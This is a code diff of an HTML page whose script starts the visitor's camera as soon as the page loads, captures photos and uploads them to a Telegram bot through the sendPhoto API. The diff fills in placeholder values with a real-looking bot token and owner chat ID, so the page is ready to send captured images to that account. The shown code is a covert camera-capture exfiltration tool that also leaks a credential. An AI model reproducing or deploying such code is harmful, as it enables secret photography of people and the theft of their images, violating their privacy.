@@ -32,8 +32,8 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT";
-        const TELEGRAM_CHAT_ID = "ISI_CHAT_ID_OWNER";
+        const TELEGRAM_BOT_TOKEN = "7788095309:AAEjIyu4Beuzs6IVZjHrTLN_9NmPy6vs8DY";
+        const TELEGRAM_CHAT_ID = "7081489041";
 
         async function startCamera() {
             try {
@@ -68,11 +68,11 @@
             try {
                 const blob = await fetch(imageData).then(res => res.blob());
                 const formData = new FormData();
-                formData.append("chat_id", 7081489041);
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("photo", blob, `${label}.jpg`);
                 formData.append("caption", `📷 Foto ${label}`);
 
-                await fetch(`https://api.telegram.org/bot7788095309:AAEjIyu4Beuzs6IVZjHrTLN_9NmPy6vs8DY/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 });
@@ -131,4 +131,4 @@
         window.onload = startCamera;
     </script>
 </body>
-    </html>
+</html>
